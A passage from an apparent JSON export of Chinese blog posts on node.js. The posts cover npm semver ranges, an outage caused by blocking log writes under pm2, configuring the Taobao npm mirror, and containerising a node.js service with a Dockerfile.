\u4f7f\u7528 <a href=\"https:\/\/github.com\/npm\/node-semver\">semver<\/a> \u5305\u8fdb\u884c\u7248\u672c\u53f7\u89e3\u6790\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7248\u672c\u53f7\u89e3\u6790\u793a\u4f8b<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u8fd9\u7bc7\u6587\u7ae0\u300a<a href=\"http:\/\/deadhorse.me\/nodejs\/2014\/04\/27\/semver-in-nodejs.html\">node.js \u4e2d\u7684\u7248\u672c\u7ba1\u7406<\/a>\u300b\u5bf9\u5e38\u89c1\u7684\u7248\u672c\u53f7\u98ce\u683c\u8fdb\u884c\u4e86\u89e3\u91ca\uff0c\u867d\u7136\u5bf9 <code>^<\/code> \u524d\u7f00\u89e3\u6790\u4e0d\u6e05\uff0c\u4f46\u8fd8\u662f\u503c\u5f97\u4e00\u770b\uff0c\u540c\u65f6\u4e86\u63d0\u4f9b\u4e86\u4f7f\u7528\u5efa\u8bae\u3002\n<\/p>\n\n<p>\n\u7248\u672c\u53f7\u683c\u5f0f\uff1a <code>\u4e3b\u7248\u672c\u53f7.\u6b21\u7248\u672c\u53f7.\u4fee\u8ba2\u53f7<\/code>\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> 1.2.1 <\/dt><dd>\u5339\u914d\u6307\u5b9a\u7248\u672c\uff0c\u8fd9\u91cc\u662f\u5339\u914d1.2.1\u3002\n<\/dd>\n\n<dt> ^1.0.0 <\/dt><dd>\u5339\u914d &gt;=1.0.0 \u4e14 &lt;2.0.0\u7684\u7248\u672c\u3002\n\n<p>\n<code>^<\/code> \u524d\u7f00\u610f\u4e3a <code>\u4e0e\u6307\u5b9a\u7684\u7248\u672c\u517c\u5bb9<\/code> \u3002\n<\/p>\n\n<p>\n<code>^<\/code> \u524d\u7f00\u8868\u793a\u6700\u5de6\u8fb9\u7684\u975e0\u6bb5\u4e0d\u5141\u8bb8\u6539\u53d8\uff0c\u8be5\u6bb5\u4e4b\u540e\u7684\u6bb5\u53ef\u4ee5\u4e3a\u66f4\u9ad8\u7248\uff0c\u6240\u4ee5\n<\/p>\n\n<p>\n^1.1.0 \u5339\u914d &gt;=1.1.0 \u4e14 &lt;2.0.0\n<\/p>\n\n<p>\n^0.0.3 \u5339\u914d &gt;=0.0.3 \u4e14 &lt;0.0.4\n<\/p>\n<\/dd>\n\n<dt> latest <\/dt><dd>\u5f53\u524d\u53d1\u5e03\u7248\u672c\u3002\n\n<p>\n\u8fd9\u662f\u4e00\u4e2a\u6807\u8bb0\uff08tag\uff0c\u8be6\u89c1 <a href=\"https:\/\/docs.npmjs.com\/cli\/dist-tag\">dist-tag | npm Documentation<\/a>\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b <code>npm install<\/code> \u5b89\u88c5\u7684\u5c31\u662f\u8fd9\u4e2a <code>latest<\/code> \u6807\u8bb0\u3002\n\u5e38\u89c1\u7684\u6807\u8bb0\u8fd8\u6709 <code>next<\/code> <code>stable<\/code> <code>beta<\/code> <code>canary<\/code> \u3002\n<\/p>\n<\/dd>\n\n<dt> ^5.x <\/dt><dd>\u5339\u914d &gt;=5.0.0 \u4e14 &lt;6.0.0\u3002\n\n<p>\n<code>X<\/code>, <code>x<\/code> \u53ca <code>*<\/code> \u4e3a\u901a\u914d\u7b26\uff0c\u7248\u672c\u53f7\u5c3e\u90e8\u7701\u7565\u7684\u6bb5\u7b49\u540c\u4e8e\u901a\u914d\u7b26\uff0c\u6240\u4ee5\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5339\u914d &gt;=0.0.0\n<\/li>\n<\/ul>\n<p>\n1   \u5339\u914d &gt;=1.0.0 \u4e14 &lt;2.0.0\n<\/p>\n\n<p>\n1.2 \u5339\u914d &gt;=1.2.0 \u4e14 &lt;1.3.0\n<\/p>\n<\/dd>\n\n<dt> ~0.1.1 <\/dt><dd>\u5339\u914d &gt;=0.1.1 \u4e14 &lt;0.2.0\u3002\n\n<p>\n<code>~<\/code> \u524d\u7f00\u610f\u4e3a <code>\u7ea6\u7b49\u4e8e\u7248\u672c<\/code>\n<\/p>\n\n<p>\n\u5982\u679c\u5b58\u5728\u6b21\u7248\u672c\u53f7\uff0c\u5219\u5141\u8bb8\u4fee\u8ba2\u53f7\u4e3a\u66f4\u9ad8\u7248\uff0c\u5426\u5219\u5141\u8bb8\u6b21\u7248\u672c\u53f7\u4e3a\u66f4\u9ad8\u7248\u3002\n<\/p>\n\n<p>\n~1 \u5339\u914d &gt;=1.0.0 \u4e14 &lt;2.0.0\n<\/p>\n<\/dd>\n\n<dt> * <\/dt><dd>\u5339\u914d &gt;=0.0.0\n<\/dd>\n\n<dt> &gt;=3.0.0 <\/dt><dd>\u540c\u5b57\u9762\u610f\u4e49 &gt;=3.0.0\u3002\n\n<p>\n\u5176\u5b83\u64cd\u4f5c\u7b26\u6709 &lt; &lt;= &gt; &gt;= = \uff0c\u591a\u4e2a\u8868\u8fbe\u5f0f\u4e4b\u95f4\u7528 \u7a7a\u683c \u5206\u9694\u8868\u793a\u5e76\u96c6\uff0c\u7528 || \u5206\u9694\u4ea4\u96c6\u3002\n<\/p>\n<\/dd>\n\n<dt> 1.30.2 - 2.30.2 <\/dt><dd>\u5339\u914d &gt;=1.30.2 \u4e14 &lt;=2.30.2\n\n<p>\n\u5c3e\u90e8\u7f3a\u5931\u7684\u8282\u88ab\u66ff\u6362\u4e3a0\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\uff1a1.30 - 2.30.2 \u540c 1.30.0 - 2.30.2\u3002\n<\/p>\n<\/dd>\n\n<dt> git+<a href=\"http:\/\/ikt.pm2.io\/ikt.git#master\">http:\/\/ikt.pm2.io\/ikt.git#master<\/a> <\/dt><dd>Git URL\u5f62\u5f0f\u7684\u4f9d\u8d56\n\n<p>\n\u8fd8\u652f\u6301URL\u3001GitHub URL\u3001\u672c\u5730 URL\uff0c\u8be6\u89c1 <a href=\"https:\/\/docs.npmjs.com\/files\/package.json#urls-as-dependencies\">URLs as Dependencies<\/a>\n<\/p>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li><a href=\"https:\/\/docs.npmjs.com\/files\/package.json\">package.json | npm Documentation<\/a>\n<\/li>\n\n<li><a href=\"http:\/\/blog.nodejitsu.com\/package-dependencies-done-right\/\">Package.json dependencies done right | Nodejitsu Inc.<\/a>\n<\/li>\n\n<li><a href=\"http:\/\/deadhorse.me\/nodejs\/2014\/04\/27\/semver-in-nodejs.html\">node.js \u4e2d\u7684\u7248\u672c\u7ba1\u7406<\/a>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "node.js\u5199\u65e5\u5fd7\u5835\u585e\u95ee\u9898",
  "timestamp": "2015-12-12 20:19:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u4eca\u5929\u9047\u5230\u4e00\u8d77\u540e\u53f0\u670d\u52a1\u4e2d\u65ad\u95ee\u9898\uff0c\u539f\u56e0\u662f\u6709\u4e00\u4e2a\u670d\u52a1\u5199\u65e5\u5fd7\u5bfc\u81f4\u78c1\u76d8\u6ee1\uff0c\u6e05\u6389\u65e5\u5fd7\u91ca\u653e\u78c1\u76d8\u7a7a\u95f4\u540e\uff0c\u670d\u52a1\u65e0\u6cd5\u81ea\u52a8\u6062\u590d\uff0c\u6b64\u65f6\u6709\u4ee5\u4e0b\u75c7\u72b6\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li><code>node.js<\/code> \u8fdb\u7a0b\u5185\u5b58\u5360\u7528\u8d85\u9ad8\uff08\u8d85\u8fc71G\uff09\uff0cCPU\u5360\u7528\u8d85\u9ad8\uff08\u63a5\u8fd1100%\uff09\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u8fd0\u884c\u5f02\u5e38\n\n<p>\n<code>stop<\/code> \u548c <code>delete<\/code> \u64cd\u4f5c\u4f1a\u5361\u4f4f\uff0c <code>start<\/code> \u548c <code>restart<\/code> \u64cd\u4f5c\u5931\u8d25\u3002\n<\/p>\n\n<p>\n\u540e\u53f0\u6709\u5927\u91cf <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u8fdb\u7a0b\uff0c\u5e94\u8be5\u662f <code>crontab<\/code> \u6bcf\u5206\u949f\u8c03\u7528 <code>pm2 start<\/code> \u786e\u4fdd\u670d\u52a1\u62c9\u8d77\u5bfc\u81f4\u3002\n<\/p>\n\n<p>\n<code>killall -9 node<\/code> \u53ca <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u4ecd\u7136\u65e0\u6cd5\u5c06\u670d\u52a1\u6062\u590d\u3002\n<\/p>\n\n<p>\n<code>pm2 kill<\/code> \u4e5f\u4f1a\u5361\u4f4f\uff0c\u6700\u7ec8\u901a\u8fc7 <code>kill -9<\/code> \u5e72\u6389 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u7684\u540e\u53f0\u8fdb\u7a0b <code>PM2 v0.14.3: God Daemon<\/code> \u624d\u628a\u670d\u52a1\u91cd\u65b0\u542f\u52a8\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n\n<p>\n\u4e00\u4e2a\u5c0f\u65f6\u540e\u53c8\u51fa\u73b0\u9669\u60c5\uff0c\u7c7b\u4f3c\u7684\u75c7\u72b6\uff0c\u867d\u7136\u6ca1\u6709\u4e25\u91cd\u5230\u4e2d\u65ad\u670d\u52a1\uff0c\u4f46\u662f <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u5931\u63a7\u5f88\u8ba9\u4eba\u63ea\u5fc3\uff0c\u670d\u52a1\u5f00\u4e86\u4e24\u4e2a\u5b9e\u4f8b\uff0c\u5176\u4e2d\u4e00\u4e2a\u5b9e\u4f8b\u72b6\u6001\uff1a\n<\/p>\n\n<pre class=\"example\">\n    \u2502 App name          \u2502 id \u2502 mode    \u2502 pid \u2502 status  \u2502 restart \u2502 uptime \u2502 memory \u2502 watching \u2502\n    \u2502 xxx.xxxxxxxxx.com \u2502 0  \u2502 cluster \u2502 N\/A \u2502 errored \u2502 2       \u2502 0      \u2502 0 B    \u2502 disabled \u2502\n<\/pre>\n\n<p>\n\u6267\u884c <code>pm2 delete 0<\/code> \u4e5f\u662f\u6302\u4f4f\uff0c\u6700\u7ec8\u8fd8\u662f\u901a\u8fc7 <code>kill -9<\/code> \u5e72\u6389 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u7684\u540e\u53f0\u8fdb\u7a0b <code>PM2 v0.14.3: God Daemon<\/code> \u624d\u628a\u670d\u52a1\u91cd\u65b0\u542f\u52a8\u3002\n<\/p>\n\n<p>\n<code>top<\/code> \u770b\u5230\u7684\u8fdb\u7a0b\u72b6\u6001\uff1a\n<\/p>\n\n<pre class=\"example\">\n PID USER      PR  NI  VIRT  RES  SHR S %CPU   %MEM  TIME+   COMMAND           \n1640 nobody    20   0  793m 149m 8468 R 105.5  0.9   0:34.74 node \/usr\/local  \n1649 nobody    20   0  796m 152m 8472 R 103.6  1.0   0:34.78 node \/usr\/local\n<\/pre>\n\n<p>\n\u670d\u52a1\u8f93\u51fa\u7684\u65e5\u5fd7\u91cf\u5728\u6bcf\u79d2700\u884c\uff08\u6bcf\u884c\u4e0d\u8d85\u8fc7120\u4e2a\u5b57\u7b26\uff09\u5de6\u53f3\uff0c\u6700\u7ec8\u5c06\u65e5\u5fd7\u7ea7\u522b\u8c03\u5230 <code>error<\/code> \uff0c\u51e0\u4e4e\u4e0d\u518d\u8f93\u51fa\u65e5\u5fd7\uff0c\u65b9\u624d\u5c06CPU\u5360\u7528\u964d\u4e0b\u6765\uff1a\n<\/p>\n\n<pre class=\"example\">\n    PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND           \n3527 nobody       20   0  829m 185m 8476 R 62.3  1.2  30:41.12 node \/usr\/local\n3537 nobody       20   0  825m 181m 8476 R 60.4  1.1  30:45.96 node \/usr\/local\n<\/pre>\n\n\n<p>\n\u6211\u4f7f\u7528\u7684\u65e5\u5fd7\u6a21\u5757\u4e3a <a href=\"https:\/\/github.com\/baryon\/tracer\">tracer<\/a> \uff0c\u7b80\u5355\u5730\u901a\u8fc7 <code>tracer.console(options)<\/code> \u5b9e\u4f8b\u5316\u5168\u5c40\u7684\u65e5\u5fd7\u5bf9\u8c61\uff0c\u6700\u7ec8\u5199\u65e5\u5fd7\u8c03\u7528\u7684\u662f <code>console.log<\/code> \u3002\n<\/p>\n\n<p>\n\u5728\u4e0a\u5c42\uff0c\u6211\u4f7f\u7528 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u6765\u505a\u8fdb\u7a0b\u7ba1\u7406\uff0c\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u542f\u52a8\u6211\u7684\u670d\u52a1\uff1a\n<\/p>\n\n<pre class=\"example\">\npm2 -n xxx.xxxxxxxxx.com -l \/usr\/local\/xxx.xxxxxxxxx.com\/run.log --merge-logs start \/usr\/local\/xxx.xxxxxxxxx.com\/src\/index.js -i 2\n<\/pre>\n\n<p>\n\u901a\u8fc7 <code>pm2 describe xxx.xxxxxxxxx.com<\/code> \u8f93\u51fa\u53ef\u4ee5\u53d1\u73b0\u6700\u7ec8\u4f1a\u5199\u4e09\u4e2a\u65e5\u5fd7\u6587\u4ef6\uff1a\n<\/p>\n\n<pre class=\"example\">\n     \u2502 entire log path   \u2502 \/usr\/local\/xxx.xxxxxxxxx.com\/run.log             \u2502\n     \u2502 error log path    \u2502 \/root\/.pm2\/logs\/xxx.xxxxxxxxx.com-error.log      \u2502\n     \u2502 out log path      \u2502 \/root\/.pm2\/logs\/xxx.xxxxxxxxx.com-out.log        \u2502\n<\/pre>\n\n<p>\n\u6839\u636e <a href=\"https:\/\/nodejs.org\/docs\/latest-v0.12.x\/api\/console.html#console_console\">console\u7684\u6587\u6863<\/a> \u4e2d\u7684\u63cf\u8ff0\uff1a\n<\/p>\n\n<blockquote>\n<p>\nThe console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).\n<\/p>\n\n<p>\n\u5982\u679c\u8f93\u51fa\u76ee\u6807\u4e3a\u7ec8\u7aef\u6216\u6587\u4ef6\u65f6\uff0cconsole\u51fd\u6570\u662f\u540c\u6b65\u7684\uff08\u907f\u514d\u7a0b\u5e8f\u8fc7\u65e9\u9000\u51fa\u5bfc\u81f4\u4e22\u6d88\u606f\uff09\uff0c\u76ee\u6807\u4e3a\u7ba1\u9053\u65f6\u5219\u4e3a\u5f02\u6b65\uff08\u907f\u514d\u957f\u65f6\u95f4\u5835\u585e\uff09\u3002\n<\/p>\n<\/blockquote>\n\n<p>\n\u8fd9\u4e2a\u7279\u6027\u5f15\u8d77\u7684\u95ee\u9898\u6211\u4e5f\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html\">process.exit\u5bfc\u81f4\u7684\u63a7\u5236\u53f0\u8f93\u51fa\u4e0d\u5168<\/a> \u300b\u91cc\u6709\u63d0\u53ca\u3002\n<\/p>\n\n<p>\n\u4e5f\u5c31\u662f\u8bf4\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\uff0c\u6211\u4eec\u7684\u670d\u52a1\u5199\u65e5\u5fd7\u662f\u963b\u585e\u5f0f\u7684\uff0c\u6bcf\u79d2\u949f\u540c\u6b65\u65b9\u5f0f\u5199700\u884c\u65e5\u5fd7\u5230\u4e00\u5757\u666e\u901a\u673a\u68b0\u786c\u76d8\u4e0a\uff0c <code>node.js<\/code> \u4e0d\u5361\u6b7b\u624d\u602a\uff0c\u66f4\u4f55\u51b5\u8fd9\u5757\u786c\u76d8\u4e0a\u8fd8\u5728\u88ab\u5176\u5b83\u670d\u52a1\u9891\u7e41\u8bfb\u5199\u3002\n<\/p>\n\n<p>\n\u4e00\u4e2a\u670d\u52a1\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4e0d\u5199\u65e5\u5fd7\u6587\u4ef6\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u5728 <code>node.js<\/code> \u5199\u65e5\u5fd7\u65b9\u9762\u9700\u8981\u627e\u5230\u66f4\u4f18\u7684\u65b9\u6848\u3002\n<\/p>\n\n<p>\n\u4f46\u662f\u5728\u5bfb\u627e\u66f4\u597d\u7684\u65b9\u6848\u4e4b\u524d\uff0c\u6211\u505a\u4e86\u4e00\u4e2a\u5e38\u8bc6\u6027\u7684\u601d\u8003\uff1a\n<\/p>\n\n<blockquote>\n<p>\n\u5c06\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u5199\u5230\u78c1\u76d8\u6587\u4ef6\u7684\u6a21\u5757\uff0c\u9664\u975e\u5b83\u4e22\u5f03\u65e5\u5fd7\uff0c\u5f53\u78c1\u76d8\u5199\u5165\u65e0\u6cd5\u8ddf\u4e0a\u65e5\u5fd7\u4ea7\u751f\u7684\u901f\u5ea6\uff0c\u5c31\u8981\u6682\u5b58\u5230\u67d0\u4e2a\u5730\u65b9\uff0c\u5b83\u53ef\u80fd\u662f\u672c\u673a\u7684\u5185\u5b58\u6216\u8fde\u7f51\u7684\u53e6\u4e00\u53f0\u673a\u5668\u3002\n<\/p>\n<\/blockquote>\n\n<p>\n\u6240\u4ee5\u6211\u6700\u7ec8\u8981\u627e\u7684\uff0c\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5f02\u6b65\u5199\u65e5\u5fd7\u6587\u4ef6\u7684\u6a21\u5757\uff0c\u8fd8\u8981\u5148\u51cf\u5c11\u78c1\u76d8\u5199\u5165\u91cf\uff0c\u6216\u8005\u65e5\u5fd7\u4e0d\u76f4\u63a5\u5199\u5230\u78c1\u76d8\u6587\u4ef6\uff0c\u800c\u662f\u53d1\u9001\u5230\u4e00\u4e2a\u65e5\u5fd7\u670d\u52a1\uff0c\u5982\u679c\u65e5\u5fd7\u662f\u5199\u5728\u672c\u5730\u78c1\u76d8\uff0c\u6700\u597d\u80fd\u591f\u505a\u5230\u78c1\u76d8\u6ee1\u65f6\u4e0d\u4e2d\u65ad\u670d\u52a1\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e22\u5931\u65e5\u5fd7\u4e5f\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u3002<\/p>\n"
},
{
  "title": "\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u52a0\u901fnpm",
  "timestamp": "2015-12-16 17:42:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u4f7f\u7528 <code>npm<\/code> \u5b89\u88c5 <code>node.js<\/code> \u5305\u65f6\u4f1a\u5f88\u6162\uff0c\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u53ef\u4ee5\u63d0\u9ad8\u901f\u5ea6\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u65b9\u5f0f\u4e00\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install --registry=https:\/\/registry.npm.taobao.org\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u65b9\u5f0f\u4e8c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">npm_config_registry<\/span>=https:\/\/registry.npm.taobao.org\nnpm install\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u65b9\u5f0f\u4e09\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm config set <span style=\"color: #ffcc66;\">registry<\/span>=https:\/\/registry.npm.taobao.org\nnpm install\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u6700\u540e\u518d\u63a8\u8350\u4e00\u4e0b <a href=\"http:\/\/npm.taobao.org\/\">\u6dd8\u5b9d NPM \u955c\u50cf<\/a> \uff0c\u4e0d\u4f46\u6709 <code>npm<\/code> \u7684\u955c\u50cf\uff0c\u8fd8\u6709 <a href=\"http:\/\/npm.taobao.org\/mirrors\/node\">node.js\u955c\u50cf<\/a> \uff0c\u4ee5\u540e\u5b89\u88c5 <code>node.js<\/code> \u53ef\u4ee5\u66f4\u65b9\u4fbf\u4e86\u3002<\/p>\n"
},
{
  "title": "node.js\u670d\u52a1\u8fc1\u79fb\u5230docker\u5bb9\u5668",
  "timestamp": "2015-12-17 16:54:00",
  "tags": [
    "node",
    "docker"
  ],
  "body": "<p>\n\u8fd9\u662f\u4e00\u7bc7 <code>docker<\/code> \u5b9e\u8df5\u6559\u7a0b\uff0c\u5c06 <a href=\"https:\/\/github.com\/tangxinfa\/upload-fiddle\">tangxinfa\/upload-fiddle<\/a> \u8fd9\u4e2a <code>node.js<\/code> \u670d\u52a1\u5c01\u88c5\u6210 <code>docker<\/code> \u5bb9\u5668\u3002\n\u76f8\u5173\u4ee3\u7801\u5df2\u63d0\u4ea4\u5230 <a href=\"https:\/\/github.com\/tangxinfa\/upload-fiddle\">tangxinfa\/upload-fiddle<\/a> \u9879\u76ee\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7f16\u5199 <code>Dockerfile<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<pre class=\"example\">\n<span id=\"coderef-dockerpool\" class=\"coderef-off\"><span class=\"linenr\"> 1: <\/span>FROM dl.dockerpool.com:5000\/ubuntu:14.04<\/span>\n<span class=\"linenr\"> 2: <\/span>\n<span class=\"linenr\"> 3: <\/span>MAINTAINER tangxinfa &lt;tangxinfa@gmail.com&gt;\n<span class=\"linenr\"> 4: <\/span>\n<span class=\"linenr\"> 5: <\/span># Change apt sources\n<span id=\"coderef-163-ubuntu\" class=\"coderef-off\"><span class=\"linenr\"> 6: <\/span>ADD .docker\/sources.list \/etc\/apt\/sources.list<\/span>\n<span class=\"linenr\"> 7: <\/span>\n<span class=\"linenr\"> 8: <\/span># Install python\n<span class=\"linenr\"> 9: <\/span>RUN \\\n<span class=\"linenr\">10: <\/span>    apt-get update &amp;&amp; apt-get -y -qq install python wget\n<span class=\"linenr\">11: <\/span>\n<span class=\"linenr\">12: <\/span># Install node\n<span class=\"linenr\">13: <\/span>RUN \\\n<span class=\"linenr\">14: <\/span>    wget http:\/\/npm.taobao.org\/mirrors\/node\/v0.12.9\/node-v0.12.9-linux-x64.tar.gz &amp;&amp;\\\n<span class=\"linenr\">15: <\/span>    tar xzf node-v0.12.9-linux-x64.tar.gz -C \/usr\/local\n<span class=\"linenr\">16: <\/span>\n<span class=\"linenr\">17: <\/span>WORKDIR \/usr\/local\/upload-fiddle\/\n<span class=\"linenr\">18: <\/span>\n<span class=\"linenr\">19: <\/span># Install node modules\n<span class=\"linenr\">20: <\/span>ADD package.json .\/\n<span class=\"linenr\">21: <\/span>ADD *.bashrc .\/\n<span class=\"linenr\">22: <\/span>RUN \\\n<span class=\"linenr\">23: <\/span>    ln -s \/usr\/local\/node-v0.12.9-linux-x64 .\/node\n<span class=\"linenr\">24: <\/span>RUN \\\n<span id=\"coderef-npm-taobao\" class=\"coderef-off\"><span class=\"linenr\">25: <\/span>    [\"\/bin\/bash\", \"-c\", \"source .bashrc; npm install --registry=https:\/\/registry.npm.taobao.org\"]<\/span>\n<span class=\"linenr\">26: <\/span>\n<span class=\"linenr\">27: <\/span># Add project files\n<span class=\"linenr\">28: <\/span>COPY src .\/src\n<span class=\"linenr\">29: <\/span>COPY config .\/config\n<span class=\"linenr\">30: <\/span>ADD *.sh .\/\n<span class=\"linenr\">31: <\/span>ADD public\/*.html .\/public\/\n<span class=\"linenr\">32: <\/span>\n<span class=\"linenr\">33: <\/span># Create directory for upload files.\n<span class=\"linenr\">34: <\/span>RUN \\\n<span class=\"linenr\">35: <\/span>    mkdir public\/files &amp;&amp;\\\n<span class=\"linenr\">36: <\/span>    chmod a+w public\/files\n<span class=\"linenr\">37: <\/span>\n<span class=\"linenr\">38: <\/span># Start service.\n<span id=\"coderef-read\" class=\"coderef-off\"><span class=\"linenr\">39: <\/span>CMD [\"\/bin\/bash\", \"-c\", \".\/start.sh &amp;&amp; read\"]<\/span>\n<\/pre>\n\n<dl class=\"org-dl\">\n<dt> \u914d\u7f6e\u884c <a href=\"#coderef-dockerpool\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dockerpool');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dockerpool');\">1<\/a> <\/dt><dd>\u5728\u5b98\u65b9\u4ed3\u5e93\u88ab\u5899\u7684\u5927\u73af\u5883\u4e0b\uff0c\u4f7f\u7528 <code>dockerpool.com<\/code> \u63d0\u4f9b\u7684\u955c\u50cf\n<\/dd>\n\n<dt> \u914d\u7f6e\u884c <a href=\"#coderef-163-ubuntu\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-163-ubuntu');\" onmouseout=\"CodeHighlightOff(this, 'coderef-163-ubuntu');\">6<\/a> <\/dt><dd>\u4f7f\u7528163\u7684ubuntu\u6e90\uff0c\u63d0\u9ad8\u901f\u5ea6\n<\/dd>\n\n<dt> \u914d\u7f6e\u884c <a href=\"#coderef-npm-taobao\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-npm-taobao');\" onmouseout=\"CodeHighlightOff(this, 'coderef-npm-taobao');\">25<\/a> <\/dt><dd>\u4f7f\u7528taobao\u7684npm\u6e90\uff0c\u63d0\u9ad8\u901f\u5ea6\n<\/dd>\n\n<dt> \u914d\u7f6e\u884c <a href=\"#coderef-read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-read');\">39<\/a> <\/dt><dd>\u8c03\u7528read\u547d\u4ee4\u907f\u514d\u547d\u4ee4\u9000\u51fa\u5bfc\u81f4\u5bb9\u5668\u505c\u6b62\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u521b\u5efa <code>docker<\/code> \u955c\u50cf<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker build -t <span style=\"color: #66cccc;\">'tangxinfa\/upload-fiddle:0.0.1'<\/span> .\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u8fd0\u884c <code>docker<\/code> \u5bb9\u5668<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -idt --name=<span style=\"color: #66cccc;\">'upload-fiddle'<\/span> -p 127.0.0.1:80:80 <span style=\"color: #66cccc;\">'tangxinfa\/upload<\/span><span style=\"color: #66cccc; text-decoration: underline;\">-fiddle:0.0.1'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u73b0\u5728\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee\u670d\u52a1\u4e86\uff1a<a href=\"http:\/\/localhost\/\">http:\/\/localhost\/<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u6253\u5f00 <code>docker<\/code> \u5bb9\u5668\u7ec8\u7aef\u67e5\u770b\u8fd0\u884c\u65e5\u5fd7<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker exec -ti upload-fiddle \/bin\/bash\ntail -f run.log\n<\/pre>\n<\/div>\n\n<p>\n\u76f4\u63a5 <code>exit<\/code> \u9000\u51fa\u7ec8\u7aef\u4e0d\u4f1a\u505c\u6b62\u5bb9\u5668\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "docker\u5bb9\u5668\u6570\u636e\u6301\u4e45\u5316",
  "timestamp": "2015-12-17 23:24:00",
  "tags": [
    "docker"
  ],
  "body": "<p>\n\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:node.js-670d52a18fc179fb5230-docker-5bb95668.html\">node.js\u670d\u52a1\u8fc1\u79fb\u5230docker\u5bb9\u5668<\/a> 